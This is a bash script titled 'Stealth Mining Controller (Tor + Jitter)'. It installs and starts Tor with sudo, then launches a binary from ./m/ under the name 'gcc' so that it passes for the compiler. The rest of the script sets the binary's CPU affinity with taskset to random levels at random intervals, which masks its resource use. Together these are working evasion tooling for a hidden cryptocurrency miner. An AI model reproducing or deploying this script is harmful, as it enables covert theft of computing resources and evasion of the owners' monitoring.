#!/usr/bin/env bash

set -u

# ------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------

# The binary inside the repo to run
BINARY_NAME="gcc" 
BINARY_PATH="./m/${BINARY_NAME}"

# Random CPU target:
MIN_PERCENT=1
MAX_PERCENT=75

# Random delay between changes (seconds):
MIN_DELAY=1
MAX_DELAY=60

# ------------------------------------------------------------
# SETUP & CLEANUP
# ------------------------------------------------------------

echo "=========================================="
echo " Stealth Mining Controller (Tor + Jitter)"
echo "=========================================="

# 2. Update System & Install Tor
echo "[*] Updating system and installing Tor..."
sudo apt update -y
sudo apt install tor -y

# 3. Start Tor in the background
echo "[*] Starting Tor daemon..."
(tor &)
# Wait briefly for Tor to initialize
sleep 2

# 5. Make executable and verify
if [ ! -x "${BINARY_PATH}" ]; then
    chmod +x "${BINARY_PATH}"
fi

if [ ! -x "${BINARY_PATH}" ]; then
    echo "Error: ${BINARY_PATH} is not executable or missing."
    exit 1
fi

# ------------------------------------------------------------
# LAUNCH PROCESS
# ------------------------------------------------------------

echo "[*] Launching ${BINARY_NAME}..."
"${BINARY_PATH}" &
LAUNCH_PID=$!

# Give it a moment to start
sleep 1

# Verify it's running
if ! kill -0 "${LAUNCH_PID}" 2>/dev/null; then
    echo "Error: ${BINARY_NAME} exited immediately."
    exit 1
fi

echo "Process launched with PID: ${LAUNCH_PID}"

# ------------------------------------------------------------
# DETECT ACTIVE THREADS/CHILDREN (Optional but Recommended)
# ------------------------------------------------------------
# Note: 'taskset' on the parent PID usually affects the main thread.
# If the binary spawns children, you might want to add a loop here
# to target child PIDs as well. For now, we target the main PID.

echo "Controller started."
echo "Press Ctrl+C to stop."
echo

# ------------------------------------------------------------
# RESTORE CPU AFFINITY
# ------------------------------------------------------------

restore() {
    echo
    echo "Restoring CPU affinity for PID ${LAUNCH_PID}..."
    
    CPU_COUNT=$(nproc)
    LAST_CPU=$((CPU_COUNT - 1))
    
    # Set all CPUs back to 0..N
    taskset -apc "0-${LAST_CPU}" "${LAUNCH_PID}" >/dev/null 2>&1 || true
    
    echo "Done."
}

trap restore EXIT INT TERM

# ------------------------------------------------------------
# RANDOM CPU CONTROL LOOP
# ------------------------------------------------------------

while kill -0 "${LAUNCH_PID}" 2>/dev/null; do

    # Random CPU percentage.
    PERCENT=$(
        shuf -i "${MIN_PERCENT}-${MAX_PERCENT}" -n 1
    )

    # Convert percentage to number of CPUs.
    CPU_COUNT=$(nproc)
    CPUS=$(( (CPU_COUNT * PERCENT + 99) / 100 ))

    # Always keep at least one CPU available.
    if (( CPUS < 1 )); then
        CPUS=1
    fi
     
    if (( CPUS > CPU_COUNT )); then
        CPUS=$CPU_COUNT
    fi

    LAST_CPU=$((CPUS - 1))

    # Apply affinity to the process.
    # We use -p to target the process and its threads if they are bound to it.
    if taskset -apc "0-${LAST_CPU}" "${LAUNCH_PID}" >/dev/null 2>&1; then

        # Random delay before the next CPU change.
        DELAY=$(
            shuf -i "${MIN_DELAY}-${MAX_DELAY}" -n 1
        )

        printf '[%s] Target: %3d%% | CPUs: %d/%d | Next change: %ds\n' \
            "$(date '+%H:%M:%S')" \
            "$PERCENT" \
            "$CPUS" \
            "$CPU_COUNT" \
            "$DELAY"

    else
        echo "Failed to change CPU affinity for PID ${LAUNCH_PID}."
        break
    fi

    sleep "${DELAY}"
done
